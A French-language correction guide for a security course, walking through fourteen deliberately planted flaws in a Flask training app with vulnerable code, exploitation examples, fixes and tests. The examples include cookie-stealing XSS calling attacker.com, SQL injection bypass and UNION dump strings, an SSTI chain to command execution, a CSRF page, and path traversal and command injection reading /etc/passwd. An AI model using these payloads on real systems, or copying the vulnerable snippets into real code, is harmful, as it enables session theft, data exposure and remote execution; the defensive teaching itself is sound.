# VulnPyApp — Guide de correction
## SECE843 - Security By Design

---

# PARTIE 1 — GUIDE DE CORRECTION PAS-À-PAS

---

## 📖 Comment utiliser ce guide

```
⚠️  RÉSERVÉ AUX ÉTUDIANTS après avoir tenté l'exercice.
    Consultez ce guide uniquement si vous êtes bloqué
    depuis plus de 20 minutes sur une vulnérabilité.

Approche recommandée :
  1. Lire la description de la vulnérabilité
  2. Localiser le code vulnérable VOUS-MÊME
  3. Consulter l'indice niveau 1
  4. Si toujours bloqué → indice niveau 2
  5. En dernier recours → solution complète
```

---

## 🔴 CORRECTION #1 — SQL Injection (Login)

### Localisation
```
Fichier : app.py
Fonction : login()
Ligne : ~45
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Concaténation directe dans la requête SQL
email = request.form['email']
password = request.form['password']

query = f"SELECT * FROM users WHERE email = '{email}' AND password_hash = '{password_hash}'"
user = db.session.execute(query).fetchone()
```

### Pourquoi c'est dangereux
```
Saisie attaquant dans le champ email :
  ' OR '1'='1' --

Requête résultante :
  SELECT * FROM user WHERE email = '' OR '1'='1' --' AND password = '...'

La condition '1'='1' est toujours vraie.
Le commentaire -- neutralise le reste.
→ Connexion sans mot de passe valide.
```

### 💡 Indice niveau 1
```
Python DB-API 2.0 propose un mécanisme natif pour séparer
la requête de ses paramètres. Cherchez la syntaxe avec :param.
```

### 💡 Indice niveau 2
```
SQLAlchemy ORM dispose d'une méthode filter_by() qui
paramétrise automatiquement. Utilisez User.query.filter_by()
plutôt que db.session.execute() avec du SQL brut.
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ - Méthode 1 : ORM SQLAlchemy (recommandé)
from models import User

email = request.form.get('email', '').strip()
password = request.form.get('password', '')

# L'ORM construit une requête paramétrée automatiquement
user = User.query.filter_by(email=email).first()

if user is None or not user.check_password(password):
    flash('Invalid credentials', 'error')
    return redirect(url_for('login'))
```

```python
# ✅ CORRIGÉ - Méthode 2 : Requête paramétrée explicite
from sqlalchemy import text

query = text("SELECT * FROM user WHERE email = :email")
result = db.session.execute(query, {'email': email}).fetchone()
```

### Vérification
```python
# Test manuel dans le champ email :
# ' OR '1'='1' --      → doit retourner 401
# alice@vulnpyapp.local → doit fonctionner normalement

# Test automatisé :
pytest tests/test_security.py::TestSQLInjection::test_sqli_login_bypass_blocked -v
```

### Référence
```
CWE-89 : Improper Neutralization of Special Elements used in an SQL Command
OWASP Top 10 2021 : A03 - Injection
CVSS v3.1 : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → Score 9.8 (Critical)
```

---

## 🔴 CORRECTION #2 — SQL Injection (Recherche)

### Localisation
```
Fichier : app.py
Fonction : search()
Ligne : ~80
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
q = request.args.get('q', '')
results = db.session.execute(
    f"SELECT * FROM products WHERE name LIKE '%{q}%'"
).fetchall()
```

### Exploitation (UNION-based)
```sql
-- Payload dans ?q=
' UNION SELECT id,email,password_hash,4,5 FROM users--

-- Requête générée :
SELECT * FROM products WHERE name LIKE '%' UNION SELECT
id,email,password_hash,4,5 FROM users--%'

-- Résultat : dump de la table users dans les résultats de recherche
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
from models import Product

q = request.args.get('q', '').strip()[:100]  # Limitation longueur

if q:
    # ilike = LIKE insensible à la casse, paramétré automatiquement
    results = Product.query.filter(
        Product.name.ilike(f'%{q}%')
    ).limit(50).all()
else:
    results = Product.query.limit(50).all()
```

### Vérification
```bash
pytest tests/test_security.py::TestSQLInjection -v
```

---

## 🟠 CORRECTION #3 — XSS Réfléchi

### Localisation
```
Fichier : templates/search.html
Ligne : ~15
```

### Code vulnérable
```html
<!-- ❌ VULNÉRABLE - |safe désactive l'échappement Jinja2 -->
<p>Résultats pour : <strong>{{ query|safe }}</strong></p>
```

### Exploitation
```
URL : /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

La balise script est injectée telle quelle dans la page.
→ Vol de session, redirection, défacement.
```

### 💡 Indice niveau 1
```
Jinja2 échappe automatiquement les variables.
Cherchez ce qui désactive cette protection.
```

### ✅ Solution complète
```html
<!-- ✅ CORRIGÉ - Supprimer |safe suffit -->
<p>Résultats pour : <strong>{{ query }}</strong></p>

<!--
  Jinja2 convertit automatiquement :
  <script> → &lt;script&gt;
  " → &#34;
  ' → &#39;
-->
```

```python
# ✅ Dans app.py, s'assurer que autoescape est activé
from flask import Flask
app = Flask(__name__)
# autoescape=True est le défaut pour .html - vérifier qu'il n'est pas désactivé

# ❌ Ne jamais faire :
from jinja2 import Environment
env = Environment(autoescape=False)  # désactive la protection globalement
```

### Vérification
```bash
# Test manuel : /search?q=<script>alert(1)</script>
# → doit afficher &lt;script&gt;alert(1)&lt;/script&gt; en source
# → aucune popup ne doit apparaître

pytest tests/test_security.py::TestXSS::test_xss_reflected_escaped -v
```

---

## 🟠 CORRECTION #4 — XSS Stocké

### Localisation
```
Fichier : app.py → route /comments (POST)
Fichier : templates/comments.html → affichage
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Stockage sans sanitization
content = request.form['content']
comment = Comment(user_id=current_user.id, content=content)
db.session.add(comment)
```

```html
<!-- ❌ VULNÉRABLE - Affichage avec |safe -->
<div>{{ c.content|safe }}</div>
```

### Exploitation
```html
<!-- Payload posté dans le formulaire de commentaire -->
<img src="x" onerror="
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
">

<!-- Exécuté pour CHAQUE visiteur qui consulte la page -->
```

### ✅ Solution complète

**Étape 1 : Sanitizer à l'entrée (Bleach)**
```python
# ✅ Dans app.py
import bleach

# Liste blanche de tags HTML autorisés
ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {}  # Aucun attribut autorisé (évite onerror, href, etc.)

@app.route('/comments', methods=['POST'])
@login_required
def post_comment():
    content = request.form.get('content', '').strip()

    if not content or len(content) > 2000:
        abort(400)

    # ✅ Sanitization : seuls les tags autorisés sont conservés
    clean_content = bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True  # Supprime les tags non autorisés (ne les échappe pas)
    )

    comment = Comment(user_id=current_user.id, content=clean_content)
    db.session.add(comment)
    db.session.commit()
    return redirect(url_for('comments'))
```

**Étape 2 : Affichage sécurisé**
```html
<!-- ✅ |safe acceptable UNIQUEMENT car Bleach a déjà nettoyé -->
<!-- Les seuls tags présents sont dans la liste blanche -->
<div>{{ c.content|safe }}</div>

<!-- Alternative plus stricte : supprimer aussi |safe -->
<!-- Dans ce cas, les balises <b> etc. s'affichent en texte brut -->
<div>{{ c.content }}</div>
```

### Règle mnémotechnique
```
Entrée  → Valider + Sanitizer (Bleach)
Sortie  → Encoder (Jinja2 auto ou |e explicite)
|safe   → UNIQUEMENT si vous contrôlez à 100% la source de la donnée
```

### Vérification
```bash
pytest tests/test_security.py::TestXSS::test_xss_stored_bleach_sanitized -v
pytest tests/test_security.py::TestXSS::test_xss_allowed_tags_preserved -v
```

---

## 🟠 CORRECTION #5 — XSS DOM-based

### Localisation
```
Fichier : templates/profile.html
Balise : <script> utilisant location.hash
```

### Code vulnérable
```html
<!-- ❌ VULNÉRABLE - injection via fragment d'URL -->
<div id="welcome"></div>
<script>
  // location.hash retourne la valeur après le # sans encodage
  const name = location.hash.slice(1);
  document.getElementById('welcome').innerHTML = name;  // ← dangereux !
</script>

<!--
  URL malveillante :
  /profile#<img src=x onerror=alert(document.cookie)>
  Aucune requête serveur → pas détectable dans les logs
-->
```

### ✅ Solution complète
```html
<!-- ✅ CORRIGÉ -->
<div id="welcome"></div>
<script nonce="{{ csp_nonce() }}">
  // ✅ textContent au lieu de innerHTML
  // textContent traite la valeur comme du texte pur, jamais comme du HTML
  const username = {{ current_user.username|tojson }};
  document.getElementById('welcome').textContent = "Hello, " + username + "!";

  // ✅ tojson encode la chaîne pour une insertion sûre dans JS
  // Pas de location.hash - la valeur vient du serveur (authentifié)
</script>
```

### Tableau des méthodes DOM : dangereuses vs sûres
```
❌ DANGEREUX        ✅ SÛR
─────────────────────────────────────────────────
innerHTML =         textContent =
outerHTML =         innerText =
document.write()    setAttribute() [selon attr]
insertAdjacentHTML  createElement()
eval()              createTextNode()
setTimeout(string)  addEventListener()
```

---

## 🔴 CORRECTION #6 — CSRF

### Localisation
```
Fichier : app.py → toutes les routes POST
Fichier : templates/*.html → formulaires
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Pas de vérification de l'origine de la requête
@app.route('/profile/update', methods=['POST'])
@login_required
def update_profile():
    username = request.form['username']
    current_user.username = username
    db.session.commit()
    # N'importe quel site peut soumettre ce formulaire à la place de l'utilisateur
```

### Exploitation
```html
<!-- Site attaquant : evil.com -->
<!-- Visiteur connecté sur vulnpyapp → formulaire soumis automatiquement -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:5000/profile/update" method="POST">
    <input type="hidden" name="username" value="hacked_by_attacker">
  </form>
</body>
</html>
```

### ✅ Solution complète

**Étape 1 : Initialiser Flask-WTF**
```python
# ✅ extensions.py
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()

# ✅ app.py
from extensions import csrf

def create_app(config_name='default'):
    app = Flask(__name__)
    csrf.init_app(app)  # Protection CSRF globale sur tous les POST
    return app
```

**Étape 2 : Ajouter le token dans chaque formulaire**
```html
<!-- ✅ Dans chaque <form method="POST"> -->
<form method="POST" action="/profile/update">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- autres champs... -->
    <button type="submit">Update</button>
</form>
```

**Étape 3 : Exclure les API JSON si nécessaire**
```python
# ✅ Pour les endpoints API consommant du JSON (avec JWT)
from flask_wtf.csrf import csrf_exempt

@app.route('/api/data', methods=['POST'])
@csrf_exempt  # Acceptable si authentification par token Bearer
def api_endpoint():
    ...
```

### Comment fonctionne le token CSRF
```
1. Serveur génère un token unique par session → stocké en session
2. Token inclus dans le formulaire HTML
3. Formulaire soumis → token renvoyé dans le POST
4. Serveur compare token reçu ↔ token en session
5. Mismatch → 400 Bad Request

Un site attaquant ne peut pas lire le token (Same-Origin Policy)
→ ne peut pas forger une requête valide
```

### Vérification
```bash
# Vérifier la présence du token dans les formulaires
curl -s http://localhost:5000/login | grep csrf_token

pytest tests/test_security.py::TestCSRF -v
```

---

## 🟠 CORRECTION #7 — IDOR (Insecure Direct Object Reference)

### Localisation
```
Fichier : app.py
Fonction : get_order()
Route : /api/orders/<int:order_id>
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Récupération par ID sans vérification du propriétaire
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get_or_404(order_id)
    return jsonify(order.to_dict())  # N'importe quel utilisateur connecté
                                      # peut accéder à n'importe quelle commande
```

### Exploitation
```python
# Alice (user_id=2) est connectée
# Bob (user_id=3) a la commande id=42

import requests
session = requests.Session()
session.post('/login', data={'email': 'alice@...', 'password': 'Alice123!'})

# Alice accède à la commande de Bob → 200 OK ❌
response = session.get('/api/orders/42')
print(response.json())  # Données de Bob exposées
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ - Filtrage par propriétaire
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    if current_user.is_admin:
        # Les admins peuvent voir toutes les commandes
        order = Order.query.get_or_404(order_id)
    else:
        # Un utilisateur ne voit que SES commandes
        # filter_by sur les deux critères → 404 si pas propriétaire
        order = Order.query.filter_by(
            id=order_id,
            user_id=current_user.id
        ).first_or_404()
        # ✅ first_or_404() retourne 404 (et non 403) pour ne pas
        # confirmer l'existence de la ressource

    return jsonify(order.to_dict())


# ✅ Endpoint dédié pour les propres commandes de l'utilisateur
@app.route('/api/my/orders')
@login_required
def my_orders():
    orders = Order.query.filter_by(user_id=current_user.id).all()
    return jsonify([o.to_dict() for o in orders])
```

### Même vulnérabilité sur `/api/users/<id>`

```
Fichier : app.py, fonction get_user(), ligne ~162
Route : /api/users/<int:user_id>
```

```python
# ❌ MÊME DÉFAUT : pas de vérification de propriétaire
user = User.query.get(user_id)
return jsonify(user.to_dict())
# Tout utilisateur connecté peut voir les données de n'importe qui
```

```python
# ✅ CORRIGÉ - Filtrer les champs exposés selon le propriétaire
@app.route('/api/users/<int:user_id>')
@login_required
def get_user(user_id):
    user = User.query.get_or_404(user_id)

    # Seul le propriétaire voit email + is_admin
    if current_user.id == user.id or current_user.is_admin:
        return jsonify(user.to_dict())
    else:
        return jsonify(user.to_safe_dict())  # username, bio seulement
```

### Principe général
```python
# ✅ Pattern à appliquer systématiquement pour toute ressource
def get_resource(resource_id):
    if current_user.is_admin:
        resource = Resource.query.get_or_404(resource_id)
    else:
        resource = Resource.query.filter_by(
            id=resource_id,
            owner_id=current_user.id  # ← clé de l'IDOR fix
        ).first_or_404()
    return resource
```

### Vérification
```bash
pytest tests/test_security.py::TestIDOR -v
```

---

## 🟠 CORRECTION #8 — Mass Assignment

### Localisation
```
Fichier : app.py
Fonction : register()
Route : /register (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Assignation directe des données du formulaire au modèle
@app.route('/register', methods=['POST'])
def register():
    data = request.form.to_dict()
    user = User(**data)  # Tous les champs du formulaire → modèle
    db.session.add(user)
    db.session.commit()

# Payload attaquant :
# email=hack@x.com&username=hacker&password=Hack123!&is_admin=true
# → Compte admin créé directement !
```

### ✅ Solution complète

**Méthode 1 : Allowlist manuelle (simple)**
```python
# ✅ CORRIGÉ - Allowlist explicite des champs autorisés
@app.route('/register', methods=['POST'])
def register():
    # ✅ Uniquement les champs que l'utilisateur est autorisé à définir
    email    = request.form.get('email', '').strip().lower()
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    bio      = request.form.get('bio', '').strip()

    # ✅ is_admin n'est JAMAIS lu depuis le formulaire
    # Valeur par défaut False définie dans le modèle

    user = User(
        email=email,
        username=username,
        bio=bio,
        is_admin=False  # Valeur fixe, jamais depuis request.form
    )
    user.set_password(password)
    db.session.add(user)
    db.session.commit()
```

**Méthode 2 : Schéma Marshmallow (robuste)**
```python
# ✅ schemas.py
from marshmallow import Schema, fields, validate, ValidationError

class RegisterSchema(Schema):
    """Seuls ces champs sont acceptés - tout autre champ est ignoré"""
    email    = fields.Email(required=True, load_only=True)
    username = fields.Str(required=True, validate=[
        validate.Length(min=3, max=80),
        validate.Regexp(r'^[a-zA-Z0-9_-]+$',
                        error='Username: letters, digits, _ and - only')
    ])
    password = fields.Str(required=True, load_only=True, validate=[
        validate.Length(min=8, max=128),
        validate.Regexp(
            r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)',
            error='Password must contain uppercase, lowercase and digit'
        )
    ])
    bio = fields.Str(validate=validate.Length(max=500), load_default='')

    # ✅ is_admin n'apparaît pas → automatiquement ignoré à la désérialisation

class ProfileUpdateSchema(Schema):
    """Mise à jour de profil : restreint aux champs modifiables"""
    username = fields.Str(validate=[
        validate.Length(min=3, max=80),
        validate.Regexp(r'^[a-zA-Z0-9_-]+$')
    ])
    bio = fields.Str(validate=validate.Length(max=500))
    # email et is_admin absents → ignorés même s'ils sont envoyés
```

```python
# ✅ Dans app.py
from schemas import RegisterSchema
from marshmallow import ValidationError

register_schema = RegisterSchema()

@app.route('/register', methods=['POST'])
def register():
    try:
        data = register_schema.load(request.form)
    except ValidationError as err:
        flash(str(err.messages), 'error')
        return redirect(url_for('register'))

    if User.query.filter_by(email=data['email']).first():
        flash('Email already registered', 'error')
        return redirect(url_for('register'))

    user = User(
        email=data['email'],
        username=data['username'],
        bio=data.get('bio', ''),
        is_admin=False  # Jamais depuis le formulaire
    )
    user.set_password(data['password'])
    db.session.add(user)
    db.session.commit()
    flash('Registration successful', 'success')
    return redirect(url_for('login'))
```

### Vérification
```bash
pytest tests/test_security.py::TestMassAssignment -v
```

---

## 🔴 CORRECTION #9 — SSTI (Server-Side Template Injection)

### Localisation
```
Fichier : app.py
Fonction : hello()
Route : /hello
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Rendu de template dynamique depuis l'entrée utilisateur
from jinja2 import Template

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Template construit avec la valeur utilisateur → exécuté par Jinja2
    template = Template(f"Hello {name}!")
    return template.render()
```

### Exploitation (escalade vers RCE)
```
Étape 1 - Détection :
  /hello?name={{ 7*7 }}
  → Affiche "Hello 49!"  (l'expression est évaluée)

Étape 2 - Accès à la configuration :
  /hello?name={{ config.SECRET_KEY }}
  → Affiche la clé secrète Flask

Étape 3 - RCE via MRO Python :
  /hello?name={{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
  → Exécute la commande système 'id'
  → Résultat : uid=0(root)...
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ - Méthode 1 : render_template avec variable (recommandé)
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')

    # Validation : nom alphanumérique uniquement
    if not re.match(r'^[a-zA-Z0-9 _-]{1,50}$', name):
        name = 'World'  # Valeur par défaut sécurisée

    # ✅ La variable est passée comme paramètre, jamais concaténée dans le template
    return render_template('hello.html', name=name)
    # Jinja2 échappe automatiquement {{ name }}
```

```python
# ✅ CORRIGÉ - Méthode 2 : render_template_string avec variable séparée
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    name = name[:50]  # Limitation de longueur

    # ✅ La variable utilisateur n'est PAS dans la chaîne de template
    # Elle est passée comme contexte → Jinja2 l'échappe
    template = "Hello {{ name }}!"
    return render_template_string(template, name=name)
    # name={{ 7*7 }} → affiche "Hello {{ 7*7 }}!" (littéral, non évalué)
```

### Règle fondamentale
```
❌ JAMAIS : Template(f"... {user_input} ...")
❌ JAMAIS : render_template_string(f"... {user_input} ...")

✅ TOUJOURS : render_template('file.html', variable=user_input)
✅ TOUJOURS : render_template_string("... {{ variable }} ...", variable=user_input)
```

### Vérification
```bash
pytest tests/test_security.py::TestSSTI -v
```

---

## 🟠 CORRECTION #10 — Path Traversal

### Localisation
```
Fichier : app.py
Fonction : download_file()
Route : /download
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
@app.route('/download')
@login_required
def download_file():
    filename = request.args.get('file', '')
    filepath = os.path.join('uploads', filename)
    return send_file(filepath)

# /download?file=../../etc/passwd → fonctionne !
# /download?file=../app.py        → code source exposé !
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
import os
from werkzeug.utils import secure_filename

UPLOAD_FOLDER = os.path.realpath('uploads')
ALLOWED_EXTENSIONS = {'.pdf', '.png', '.jpg', '.jpeg', '.txt', '.csv'}

@app.route('/download')
@login_required
def download_file():
    filename = request.args.get('file', '').strip()

    # ✅ Étape 1 : Rejeter les entrées vides
    if not filename:
        abort(400)

    # ✅ Étape 2 : secure_filename() supprime ../ et caractères dangereux
    safe_name = secure_filename(filename)
    if not safe_name:
        abort(400)

    # ✅ Étape 3 : Vérification de l'extension (liste blanche)
    ext = os.path.splitext(safe_name)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        abort(400)

    # ✅ Étape 4 : Résolution du chemin absolu réel
    filepath = os.path.realpath(os.path.join(UPLOAD_FOLDER, safe_name))

    # ✅ Étape 5 : Vérification que le fichier reste dans UPLOAD_FOLDER
    # Bloque toute tentative d'échappement via symlinks ou encodages
    if not filepath.startswith(UPLOAD_FOLDER + os.sep):
        abort(404)  # 404 plutôt que 403 : ne pas confirmer l'existence

    # ✅ Étape 6 : Vérifier que le fichier existe
    if not os.path.isfile(filepath):
        abort(404)

    return send_file(filepath)
```

### Visualisation de la protection
```
Input : ../../etc/passwd
  secure_filename() → etcpasswd  (supprime ../ et /)
  realpath()        → /app/uploads/etcpasswd
  startswith check  → /app/uploads/etcpasswd starts with /app/uploads/ ✅
  isfile()          → False → 404

Input : ../app.py
  secure_filename() → app.py
  realpath()        → /app/uploads/app.py
  startswith check  → ✅
  isfile()          → False → 404 (app.py n'est pas dans uploads/)
```

### Vérification
```bash
pytest tests/test_security.py::TestPathTraversal -v
```

---

## 🔴 CORRECTION #11 — Injection de commandes

### Localisation
```
Fichier : app.py
Fonction : ping()
Route : /ping (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - shell=True avec entrée utilisateur
import os

@app.route('/ping', methods=['POST'])
@login_required
def ping():
    host = request.form.get('host', '')
    result = os.popen(f'ping -c 1 {host}').read()
    return render_template('ping.html', result=result)

# Payload : localhost; cat /etc/passwd
# Commande exécutée : ping -c 1 localhost; cat /etc/passwd
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
import subprocess
import re
import ipaddress

# Regex liste blanche : uniquement noms de domaine valides
HOSTNAME_REGEX = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,251}[a-zA-Z0-9]$')

# Plages IP privées/réservées interdites (anti-SSRF)
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
]

def is_safe_host(host: str) -> bool:
    """Valide que le host est sûr à pinger"""
    # Vérification format
    if not HOSTNAME_REGEX.match(host):
        return False

    # Vérification si IP : pas de plage privée
    try:
        ip = ipaddress.ip_address(host)
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False
    except ValueError:
        pass  # C'est un nom de domaine, pas une IP → ok

    return True


@app.route('/ping', methods=['POST'])
@login_required
def ping():
    host = request.form.get('host', '').strip()

    if not is_safe_host(host):
        abort(400)

    try:
        # ✅ Liste de commandes, pas une chaîne → shell=False (défaut)
        # subprocess ne passe PAS par /bin/sh
        # L'injection de commandes via ; | & est impossible
        result = subprocess.run(
            ['ping', '-c', '1', '-W', '2', host],  # ← liste, pas f-string
            capture_output=True,
            text=True,
            timeout=5,
            shell=False  # ✅ Valeur par défaut, explicite pour clarté
        )
        output = result.stdout or result.stderr

    except subprocess.TimeoutExpired:
        output = "Timeout: host did not respond"
    except Exception:
        output = "Error: ping failed"

    return render_template('ping.html', result=output, host=host)
```

### Pourquoi `shell=False` protège
```
shell=True  → /bin/sh -c "ping -c 1 localhost; cat /etc/passwd"
              Le shell interprète ; comme séparateur de commandes ❌

shell=False → execve('ping', ['-c', '1', 'localhost; cat /etc/passwd'])
              L'argument est passé tel quel à ping, qui ne trouve pas l'hôte ✅
```

### Vérification
```bash
pytest tests/test_security.py::TestCommandInjection -v
```

---

## 🟡 CORRECTION #12 — Hashage faible (MD5)

### Localisation
```
Fichier : models.py
Méthode : set_password(), check_password()
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
import hashlib

class User(db.Model):
    def set_password(self, password):
        # MD5 : cassable en secondes avec des tables arc-en-ciel
        self.password_hash = hashlib.md5(password.encode()).hexdigest()

    def check_password(self, password):
        return self.password_hash == hashlib.md5(password.encode()).hexdigest()
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
from flask_bcrypt import Bcrypt

bcrypt = Bcrypt()

class User(db.Model):
    password_hash = db.Column(db.String(128), nullable=False)

    def set_password(self, password: str) -> None:
        """Hash le mot de passe avec bcrypt (cost factor 12)"""
        # ✅ bcrypt intègre un sel aléatoire automatiquement
        # ✅ cost factor 12 = ~250ms de calcul → résistant au brute-force
        self.password_hash = bcrypt.generate_password_hash(
            password,
            rounds=12  # Cost factor : doublement du temps tous les +1
        ).decode('utf-8')

    def check_password(self, password: str) -> bool:
        """Vérifie le mot de passe en temps constant"""
        # ✅ Comparaison en temps constant → pas de timing attack
        return bcrypt.check_password_hash(self.password_hash, password)
```

### Comparaison des algorithmes
```
Algorithme  | Résistance brute-force | Recommandé
────────────┼────────────────────────┼───────────
MD5         | ❌ Très faible (GPU)   | Non
SHA-1       | ❌ Faible              | Non
SHA-256     | ❌ Faible (pas de sel) | Non
SHA-256+sel | ⚠️  Moyen              | Non (PBKDF2 minimum)
PBKDF2      | ✅ Correct             | Acceptable
bcrypt      | ✅ Fort                | ✅ Recommandé
Argon2id    | ✅✅ Très fort          | ✅ Recommandé (OWASP 2023)
scrypt      | ✅✅ Très fort          | ✅ Recommandé
```

### Vérification
```bash
pytest tests/test_security.py::TestPasswordHashing -v
```

---

## 🟡 CORRECTION #13 — Cookies non sécurisés

### Localisation
```
Fichier : config.py
Fichier : app.py → création de l'application
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Configuration par défaut non sécurisée
class Config:
    SECRET_KEY = 'dev'  # Clé prévisible
    # SESSION_COOKIE_SECURE absent → False par défaut
    # SESSION_COOKIE_HTTPONLY absent → False par défaut
    # SESSION_COOKIE_SAMESITE absent → None par défaut
```

### ✅ Solution complète
```python
# ✅ config.py
import os
import secrets

class Config:
    # ✅ Clé secrète forte générée aléatoirement
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)

    # ✅ Cookie uniquement via HTTPS (mettre False en dev local)
    SESSION_COOKIE_SECURE = os.environ.get('FLASK_ENV') != 'development'

    # ✅ Cookie inaccessible depuis JavaScript → bloque vol via XSS
    SESSION_COOKIE_HTTPONLY = True

    # ✅ Cookie non envoyé dans les requêtes cross-origin → bloque CSRF
    SESSION_COOKIE_SAMESITE = 'Strict'

    # ✅ Durée de vie de session (30 minutes d'inactivité)
    PERMANENT_SESSION_LIFETIME = 1800

    # ✅ Nom du cookie non informatif
    SESSION_COOKIE_NAME = 'sid'
```

### Impact des flags
```
Flag        | Protection contre
────────────┼──────────────────────────────────────
Secure      | Interception réseau (HTTP non chiffré)
HttpOnly    | Vol de cookie via XSS (document.cookie)
SameSite    | CSRF (requêtes cross-site)
```

---

## 🟡 CORRECTION #14 — Absence de Rate Limiting

### Localisation
```
Fichier : app.py
Route : /login (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Aucune limitation de tentatives
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    # Peut être appelé des milliers de fois par seconde → brute-force possible
    user = User.query.filter_by(email=email).first()
    if user and user.check_password(password):
        login_user(user)
        return redirect(url_for('index'))
    flash('Invalid credentials')
    return render_template('login.html')
```

### ✅ Solution complète
```python
# ✅ extensions.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)
```

```python
# ✅ app.py - Double stratégie : rate limiting + lockout
from extensions import limiter
from datetime import datetime, timedelta

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # ✅ Max 5 tentatives/minute par IP
def login():
    email = request.form.get('email', '').strip().lower()
    password = request.form.get('password', '')

    user = User.query.filter_by(email=email).first()

    # ✅ Vérification du lockout compte (indépendant du rate limiting IP)
    if user and user.locked_until and user.locked_until > datetime.utcnow():
        remaining = (user.locked_until - datetime.utcnow()).seconds // 60
        flash(f'Account locked. Try again in {remaining} minutes.', 'error')
        return render_template('login.html'), 429

    if user and user.check_password(password):
        # ✅ Réinitialiser le compteur d'échecs
        user.failed_attempts = 0
        user.locked_until = None
        db.session.commit()

        login_user(user)
        return redirect(url_for('index'))

    else:
        # ✅ Incrémenter le compteur d'échecs
        if user:
            user.failed_attempts = (user.failed_attempts or 0) + 1
            if user.failed_attempts >= 5:
                user.locked_until = datetime.utcnow() + timedelta(minutes=15)
                db.session.commit()

        # ✅ Message générique : ne pas confirmer si l'email existe
        flash('Invalid email or password.', 'error')

        # ✅ Délai constant pour éviter l'énumération par timing
        import time
        time.sleep(0.3)

        return render_template('login.html'), 401


# ✅ Gestionnaire d'erreur rate limiting
@app.errorhandler(429)
def ratelimit_handler(e):
    return render_template('errors/429.html'), 429
```

### Vérification
```bash
pytest tests/test_security.py::TestRateLimiting -v
```
